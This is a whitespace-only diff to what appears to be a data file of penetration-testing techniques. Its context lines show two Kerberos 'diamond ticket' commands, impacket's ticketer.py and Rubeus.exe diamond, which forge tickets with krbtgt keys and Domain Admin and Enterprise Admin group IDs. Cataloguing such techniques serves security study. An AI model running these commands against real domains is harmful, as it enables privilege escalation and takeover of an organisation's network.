@@ -7,6 +7,7 @@ data: 'ticketer.py -request -domain ''lab.local'' -user ''domain_user'' -passwor
   ''password'' -nthash ''krbtgt/service NT hash'' -aesKey ''krbtgt/service AES key''
   -domain-sid ''S-1-5-21-...'' -user-id ''1337'' -groups ''512,513,518,519,520'' ''baduser''
 
+
   Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER
   /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS'
 output: null
@@ -21,3 +22,5 @@ ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password
 
 Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
 ```
+
+
